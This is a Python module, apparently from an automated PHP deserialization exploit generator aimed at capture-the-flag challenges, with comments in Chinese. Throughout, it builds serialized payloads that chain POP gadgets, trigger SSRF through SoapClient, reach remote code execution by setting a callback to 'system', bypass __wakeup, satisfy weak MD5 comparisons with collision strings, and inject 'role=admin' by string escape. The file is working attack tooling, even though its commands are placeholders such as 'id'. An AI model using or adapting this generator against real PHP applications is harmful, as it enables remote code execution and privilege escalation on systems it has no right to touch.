from .base import PayloadStrategy
from .registry import register_strategy
from ..serializer.php import serialize_php
from ..utils.string_escape import generate_escape_payload
import re

@register_strategy("standard")
class StandardStrategy(PayloadStrategy):
    def generate(self, class_info, features, tags):
        props = {}
        visibilities = {}
        
        # 1. 优先使用特征提取出的期望值（带类型转换）
        for cond in features.destruct_conditions:
            raw_value = cond['value']
            val_type = cond.get('type', 'unknown')
            
            # 跳过无效匹配（如正则捕获到的多余字符）
            if len(raw_value) < 2 and val_type != 'int' and val_type != 'bool':
                continue
                
            # 根据类型进行转换
            if val_type == 'int':
                props[cond['property']] = int(raw_value)
            elif val_type == 'bool':
                # 确保转换为 Python 布尔值，以便序列化器识别
                props[cond['property']] = (raw_value.lower() == 'true')
            else:
                # 字符串类型需去除可能的引号
                props[cond['property']] = raw_value.strip("'\"")

        # 1.5 处理 MD5 弱比较条件（自动填充碰撞字符串）
        md5_collision_map = {
            'QNKCDZO': '0e830400451993494058024219903391',
            '240610708': '0e462097431906509019562988736854',
            'aabg7XSs': '0e087386482136013740957780965295'
        }
        
        for cond in features.md5_weak_conditions:
            prop_name = cond['property']
            # 简化：统一使用第一个碰撞值 'QNKCDZO'
            collision_str = 'QNKCDZO'
            props[prop_name] = collision_str

        # 1.6 处理内置类实例化条件 (如 SimpleXMLElement, SoapClient)
        for cond in features.builtin_class_conditions:
            prop_name = cond['property']
            payload_value = cond['payload_value']
            
            if cond['class_name'] == 'SoapClient':
                # 构造嵌套的 SoapClient 对象以触发 SSRF
                props[prop_name] = {
                    'class_name': 'SoapClient',
                    'properties': {
                        'uri': payload_value,
                        'location': payload_value
                    },
                    'visibilities': {'uri': 'public', 'location': 'public'},
                    'bypass_wakeup': False
                }
            else:
                # 其他内置类（如 SimpleXMLElement）
                props[prop_name] = {
                    'class_name': cond['class_name'],
                    'properties': {'data': payload_value},
                    'visibilities': {'data': 'public'}
                }

        # 1.7 处理跨类 POP 链属性填充
        if hasattr(class_info, '_pop_chain_structure') and class_info._pop_chain_structure:
            chain = class_info._pop_chain_structure
            self._merge_chain_props(props, visibilities, chain)
        elif features.pop_chain_conditions:
            for cond in features.pop_chain_conditions:
                source_prop = cond['source_property']
                target_class_name = cond.get('target_class')
                
                # 尝试从全局类映射中查找目标类（如果存在）
                target_cls = None
                if hasattr(class_info, '_all_classes_map') and target_class_name in class_info._all_classes_map:
                    target_cls = class_info._all_classes_map[target_class_name]
                
                if target_cls:
                    nested_props = {}
                    nested_vis = {}
                    
                    # 关键修复：优先从构造函数中提取赋值逻辑
                    if '__construct' in target_cls.methods:
                        body = target_cls.methods['__construct'].body
                        # 提取 $this->xxx = 'yyy'
                        assign_pattern = r'\$this->(\w+)\s*=\s*[\'"]([^\'"]+)[\'"]'
                        for m in re.finditer(assign_pattern, body):
                            prop_name = m.group(1)
                            prop_value = m.group(2)
                            nested_props[prop_name] = prop_value
                            nested_vis[prop_name] = target_cls.properties.get(prop_name).visibility if prop_name in target_cls.properties else 'public'
                        
                        # 提取 $this->xxx = $param (参数传递)
                        param_assign_pattern = r'\$this->(\w+)\s*=\s*\$(\w+)'
                        for m in re.finditer(param_assign_pattern, body):
                            prop_name = m.group(1)
                            param_name = m.group(2)
                            # 简化：使用默认值 'id'
                            if prop_name not in nested_props:
                                nested_props[prop_name] = 'id'
                                nested_vis[prop_name] = target_cls.properties.get(prop_name).visibility if prop_name in target_cls.properties else 'public'
                    
                    # 补充其他属性的默认值
                    for name, p_info in target_cls.properties.items():
                        if name not in nested_props:
                            nested_props[name] = str(p_info.default_value).strip("'\"") if p_info.default_value else 'id'
                            nested_vis[name] = p_info.visibility
                    
                    props[source_prop] = {
                        'class_name': target_class_name,
                        'properties': nested_props,
                        'visibilities': nested_vis,
                        'bypass_wakeup': False
                    }
                else:
                    if source_prop not in props:
                        props[source_prop] = 'id'

        # 1.8 处理回调 RCE 属性填充 (array_map / call_user_func)
        for cond in features.callback_rce_conditions:
            if cond.get('type') == '__call_trigger':
                # 处理 __call 触发场景
                prop_name = cond['property']
                # 尝试在全局类映射中寻找含有 __call 的类
                target_cls = None
                if hasattr(class_info, '_all_classes_map'):
                    for cls in class_info._all_classes_map.values():
                        if '__call' in cls.methods:
                            target_cls = cls
                            break
                
                if target_cls:
                    nested_props = {}
                    nested_vis = {}
                    for name, p_info in target_cls.properties.items():
                        # 简化：默认值目前仍按字符串处理
                        nested_props[name] = str(p_info.default_value).strip("'\"") if p_info.default_value else 'id'
                        nested_vis[name] = p_info.visibility
                    
                    props[prop_name] = {
                        'class_name': target_cls.name,
                        'properties': nested_props,
                        'visibilities': nested_vis,
                        'bypass_wakeup': False
                    }
            else:
                # 原有的 array_map / call_user_func 逻辑
                func_prop = cond['func_prop']
                args_prop = cond['args_prop']
                if func_prop not in props:
                    props[func_prop] = 'system'
                if args_prop not in props:
                    props[args_prop] = ['id']

        # 2. 补充其他属性的默认值
        for name, prop in class_info.properties.items():
            if name not in props:
                # 简化：默认值目前仍按字符串处理，后续可扩展解析
                props[name] = str(prop.default_value).strip("'\"") if prop.default_value else ''
            visibilities[name] = prop.visibility
            
        # 3. 判断是否需要绕过 __wakeup
        bypass_wakeup = features.has_wakeup and features.has_destruct
        
        # 关键修复：如果存在 POP 链且目标类有 __wakeup，需要为嵌套对象启用 bypass
        if features.pop_chain_conditions:
            for cond in features.pop_chain_conditions:
                target_class_name = cond.get('target_class')
                if hasattr(class_info, '_all_classes_map') and target_class_name in class_info._all_classes_map:
                    target_cls = class_info._all_classes_map[target_class_name]
                    if '__wakeup' in target_cls.methods:
                        # 在 props 中找到对应的嵌套对象并设置 bypass_wakeup
                        source_prop = cond['source_property']
                        if source_prop in props and isinstance(props[source_prop], dict):
                            props[source_prop]['bypass_wakeup'] = True
        
        # 4. 处理字符串逃逸 (独立分支，确保不影响标准流程)
        if features.string_escape_conditions:
            escape_info = features.string_escape_conditions[0]
            # 针对长度减少场景 (delta < 0) 的自动化处理
            if escape_info['delta'] < 0:
                # 尝试寻找一个可以被修改的属性作为载体
                carrier_prop = None
                for p_name in props:
                    if isinstance(props[p_name], str):
                        carrier_prop = p_name
                        break
                
                if carrier_prop:
                    from ..utils import string_escape
                    # 构造注入逻辑：将当前 Payload 视为基础，进行逃逸计算
                    escaped_payload = string_escape.generate_escape_payload(
                        class_info.name, 
                        props.copy(), 
                        visibilities.copy(), 
                        escape_info,
                        target_prop='role', # 常见 CTF 场景
                        target_value='admin'
                    )
                    if escaped_payload and "ESCAPE_REDUCTION_DETECTED" not in escaped_payload:
                        return escaped_payload
            elif escape_info['direction'] == 'increase':
                # 原有的长度增加逻辑
                from ..utils import string_escape
                target_prop = 'role'
                target_value = 'admin'
                if target_prop in class_info.properties:
                    return string_escape.generate_escape_payload(
                        class_info.name, props.copy(), visibilities, 
                        escape_info, target_prop, target_value
                    )
        
        # 5. 处理动态属性赋值 (Magic 类场景) - 放在最后以确保不被覆盖
        for cond in features.dynamic_prop_assign:
            value_prop_name = cond['value_prop']
            
            # 关键修复：不直接使用 prop_var_name (可能是局部变量 $var)
            # 而是尝试找到类中可能作为动态属性名的属性 (通常是 public 字符串属性)
            # 在 Magic 类中，通常是 $prop
            target_prop_name = None
            for name, p_info in class_info.properties.items():
                if name != value_prop_name and p_info.visibility == 'public':
                    target_prop_name = name
                    break
            
            if target_prop_name:
                props[target_prop_name] = 'shell'
                visibilities[target_prop_name] = 'public'
            
            # 强制设置 $value 为嵌套的 Shell 对象
            props[value_prop_name] = {
                'class_name': 'Shell',
                'properties': {'cmd': 'id'},
                'visibilities': {'cmd': 'public'}
            }
            visibilities[value_prop_name] = 'public'
        
        # 6. 生成 Payload
        # P2-1: 检查是否启用数组格式（__serialize 钩子）
        use_array_format = class_info.has_serialize_hook and 'force_array_mode' in tags
        
        # P2-2: 传递引用映射
        return serialize_php(class_info.name, props, visibilities, bypass_wakeup, use_array_format, features.reference_map)

    def _merge_chain_props(self, props: dict, visibilities: dict, chain_node: dict):
        """递归合并 POP 链解析出的嵌套结构"""
        if not chain_node:
            return
        
        # 合并当前层的属性
        for name, val in chain_node.get('properties', {}).items():
            props[name] = val
            visibilities[name] = chain_node['visibilities'].get(name, 'public')
        
        # 合并嵌套对象
        for prop_name, sub_node in chain_node.get('nested_objects', {}).items():
            if sub_node:
                props[prop_name] = sub_node
